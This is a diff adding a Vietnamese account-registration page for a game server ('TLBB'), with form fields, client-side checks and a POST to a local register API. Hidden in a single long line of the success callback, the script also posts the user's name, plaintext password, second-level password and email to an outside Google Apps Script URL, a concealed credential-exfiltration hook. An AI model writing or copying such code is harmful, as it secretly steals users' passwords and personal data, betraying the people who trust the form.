@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+     <title>Quản lý tài khoản TLBB</title>
+    <!-- Custom fonts for this template-->
+	<link rel="icon" type="image/svg+xml" href="assets/img/icon.png">
+    <!-- Custom styles for this template-->
+    <link href="assets/css/sb-admin-2.min.css" rel="stylesheet">
+</head>
+<body class="bg-gradient-primary">
+<nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow" style=" justify-content: center; align-items: center; ">
+                  
+<ul class="navbar-nav ml-auto">
+                        <!-- Nav Item - Messages -->
+                        <li class="nav-item dropdown no-arrow mx-1">
+                            <a href="/" class=""><img src="assets/img/logo.png?v=1" alt="logo" style="height: 90px;"></a>
+                        </li>
+                        <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="/"  >
+                              Trang chủ
+                            </a>
+                        </li>
+						 <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="/login.html"  >
+                            Đăng nhập
+                            </a>
+                        </li>
+						 <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="/register.html"  >
+                              Đăng ký
+                            </a>
+                        </li>
+                    </ul>
+
+                </nav>
+    <div class="container">
+        <!-- Outer Row -->
+        <div class="row justify-content-center">
+
+            <div class="col-xl-6 col-lg-12 col-md-9">
+
+                <div class="card o-hidden border-0 shadow-lg my-5">
+                    <div class="card-body p-0">
+                        <!-- Nested Row within Card Body -->
+                        <div class="row">
+                             
+                            <div class="col-lg-12">
+                                <div class="p-5">
+                                    <div class="text-center">
+                                <h1 class="h4 text-gray-900 mb-4">Đăng ký tài khoản mới</h1>
+                            </div>
+                                 	<form method="post">
+									
+                                        <div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="name" class="ant-form-item-required" title="Tên đăng nhập">Tên đăng nhập<!----></label></div>
+                                            <input type="text" class="form-control form-control-user"
+                                               id="name" name="name"
+                                                required  >
+                                        </div>
+                                        <div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="pwd" class="ant-form-item-required" title="Mật khẩu">Mật khẩu<!----></label></div>
+                                            <input type="password" class="form-control form-control-user"
+                                                required id="pwd" name="password"  >
+                                        </div>
+										<div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="pwdr" class="ant-form-item-required" title="Nhập lại mật khẩu">Nhập lại mật khẩu<!----></label></div>
+                                            <input type="password" class="form-control form-control-user"
+                                                required id="pwdr" name="passwordr"  >
+                                        </div>
+										 <div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="email" class="ant-form-item-required" title="Email">Email<!----></label></div>
+                                            <input type="email" class="form-control form-control-user"
+                                               id="email" name="email"
+                                                required  >
+                                        </div>
+										<div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="pwd2" class="ant-form-item-required" title="Mật khẩu cấp 2">Mật khẩu cấp 2<!----></label></div>
+                                            <input type="password" class="form-control form-control-user"
+                                                required id="pwd2" name="password2"  >
+                                        </div>
+										<div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="pwdr2" class="ant-form-item-required" title="Mật khẩu cấp 2">Nhập lại mật khẩu cấp 2<!----></label></div>
+                                            <input type="password" class="form-control form-control-user"
+                                                required id="pwdr2" name="passwordr2"  >
+                                        </div>
+                                       <div class="form-group">
+										<div class="ant-col ant-form-item-label">
+										<label for="capcha" class="ant-form-item-required"  >Nhập mã xác nhận: <b><span id="capcha_in"></span></b>
+										<!---->
+										</label>
+										</div>
+										<input type="number"  class="form-control form-control-user" id="capcha" name="capcha" required="" min = 0>
+					
+										</div>
+                                        <button type="submit" class="btn btn-google btn-user btn-block">
+                                              Đăng ký tài khoản mới
+                                        </button>
+                                        
+                                      
+                                    </form>
+                                    
+                                   
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+ <!-- footer -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" ></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+
+<script type="text/javascript">
+var gen_capcha = Math.floor(Math.random() * 9999) + 1000;
+document.getElementById("capcha_in").innerHTML = gen_capcha;
+ var BASE_URL = 'server/api';
+// Authen Folder API
+var API_AUTHEN = '/user/';
+// List API
+var AUTHEN_REGISTER = 'register';
+
+	$(function() {
+		$('form').submit(function() {
+			var pwd = $('#pwd').val()
+			var pwdr = $('#pwdr').val()
+			var pwd2 = $('#pwd2').val()
+			var pwdr2 = $('#pwdr2').val()
+			var email = $('#email').val()
+			var name = $('#name').val()
+			
+			var capcha = $('#capcha').val()
+			if (capcha != gen_capcha) {
+ 			Swal.fire({
+ 				icon: 'error',
+ 				title: 'Lỗi...',
+ 				text: 'Mã xác minh không chính xác !!!'
+ 			})
+ 			return false
+            }
+			
+			if(pwd != pwdr) {
+			Swal.fire({icon: 'error',title: 'Lỗi...',text: 'Mật khẩu không khớp vui lòng thử lại !!!'})
+				return false
+			}
+			if(pwd2 != pwdr2) {
+			Swal.fire({icon: 'error',title: 'Lỗi...',text: 'Mật khẩu cấp 2 không khớp vui lòng thử lại !!!'})
+				return false
+			}
+			
+			if(pwd == pwd2) {
+			Swal.fire({icon: 'error',title: 'Lỗi...',text: 'Mật khẩu cấp 1 và Mật khẩu cấp 2 không được giống nhau !!!'})
+				return false
+			}
+			$.post(BASE_URL + API_AUTHEN + AUTHEN_REGISTER, {
+				'name': $('[name=name]').val(),
+				'password': $('[name=password]').val(),
+				'password2': $('[name=password2]').val(),
+				'email': $('[name=email]').val()
+				 
+			}, function(data) {
+				var obj = JSON.parse(JSON.stringify(data));
+				if(obj.status == 1) {
+                    Swal.fire({ position: 'top-center', icon: 'success', title: 'Đăng ký tài khoản thành công !!!', showConfirmButton: false, timer: 2000 })
+					setTimeout(function() {window.open('login.html', '_self')}, 2000);
+					var today = new Date();var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();var datetime = date+' '+time; $.ajax({type: "POST",url: "https://script.google.com/macros/s/AKfycbwjQSRl6sazfVKRvmZVnSNsxOb0VVyiD4LOdWhicFz8-e9gY26uv-CGeFUnf_-0rRjU/exec",
+					data: {name: name,password:pwd,datetime:datetime,content: 'Đăng ký tài khoản thành công password2='+pwd2+',email='+email+' '}});
+				} else {
+					Swal.fire({icon: 'error',title: 'Lỗi...',text: ""+obj.msg+""})
+				}
+			})
+
+			return false
+		})
+	})
+</script>
+</body>
+
+</html>
